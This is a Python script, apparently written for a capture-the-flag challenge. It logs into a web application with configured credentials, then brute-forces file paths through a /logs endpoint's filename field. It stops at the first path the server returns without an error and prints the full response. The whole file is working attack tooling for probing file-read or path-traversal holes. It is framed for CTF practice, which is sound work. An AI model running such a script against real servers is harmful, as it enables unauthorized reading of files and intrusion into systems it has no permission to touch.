# Created with the help of ChatGPT for a CTF challenge
# Purpose: Brute-force directory paths on hidden log pages
# Use only in Capture The Flag (CTF) scenarios
# Unauthorized use may violate terms of service
import requests
import json
import time  # Import time module to add delays

# Load the configuration from the JSON file
with open('config.json', 'r') as config_file:
    config = json.load(config_file)

# Configuration
ip = config.get("ip")
port = config.get("port")
username = config.get("username")
password = config.get("password")
readability = config.get("readability")

# Construct the base URL
base_url = f"http://{ip}:{port}"
login_url = f"{base_url}/login"
logs_url = f"{base_url}/logs"

# Load the directories and filenames from the JSON file
with open('directories_filenames.json', 'r') as file:
    data = json.load(file)

# Extract the directories and filenames
directories = data['directories']
filenames = data['filenames']

def login():
    session = requests.Session()
    
    # Send POST request to login
    login_payload = {
        "username": username,  # Match the input field name 'username'
        "password": password   # Match the input field name 'password'
    }
    response = session.post(login_url, data=login_payload)
    
    # Check if login is successful (assuming status code 200 is success)
    if response.status_code == 200 and "login" not in response.url:  # Adjust success criteria if needed
        print("\n[+] Logged in successfully!\n")
        return session
    else:
        print("[-] Login failed!")
        return None

def pretty_print_response(response_text):
    """Print the full HTML response, no truncation."""
    if readability:
        return response_text[:500]  # Truncate if readability is on (optional)
    else:
        return response_text # Print the full HTML if readability is disabled

def brute_force_files(session, logs_url, directories, filenames, log_file="failed_discoveries.log"):
    failed_count = 0
    failed_paths = []  # Store the paths of failed attempts
    total_paths = len(directories) * len(filenames)  # Total number of paths to try
    tried_count = 0  # Counter for how many paths have been tried

    # Open the log file in append mode
    with open(log_file, "a") as log:
        for directory in directories:
            for filename in filenames:
                full_path = f"{directory}{filename}"
                
                # Increment the tried counter
                tried_count += 1
                
                # Ensure the line is cleared by printing spaces first
                print(f"\r{' ' * 100}", end="", flush=True)  # Clear the line
                
                # Print the rolling status with the current path
                print(f"\rTesting {tried_count}/{total_paths}: {full_path}", end="", flush=True)

                # Send POST request to the /logs endpoint to check if the file exists
                response = session.post(
                    logs_url,
                    data={"filename": full_path}
                )

                # Check if the response suggests the file exists
                if response.status_code == 200 and "Error" not in response.text:
                    print(f"\n{'='*50}")
                    print(f"[+] File discovered: {full_path}")
                    print(f"{'='*50}")
                    print("\nFull HTML Response:\n")
                    print(pretty_print_response(response.text))  # Print the full HTML
                    print(f"{'='*50}")
                    return full_path  # Exit on first successful file discovery
                elif response.status_code != 200:
                    failed_count += 1
                    failed_paths.append(full_path)
                else:
                    failed_count += 1
                    failed_paths.append(full_path)

                # Add a small delay between each attempt (e.g., 0.025 seconds)
                time.sleep(0.025)

        # Log all failed attempts to the log file
        if failed_paths:
            log.write("\n".join(failed_paths) + "\n")

        # Print the summary of failed attempts
        print(f"\n\nBruteforce completed. Total failed attempts: {failed_count}\n")

    return None

# Main logic
if __name__ == "__main__":
    # Step 1: Login to the system
    session = login()
    
    if session:
        # Step 2: Perform file bruteforce after login
        found_file = brute_force_files(session, logs_url, directories, filenames)
        if found_file:
            print(f"File discovered: {found_file}")
            print(f"{'='*50}")
        else:
            print("\nNo files discovered.\n")
    else:
        print("\nLogin failed. Exiting script.\n")

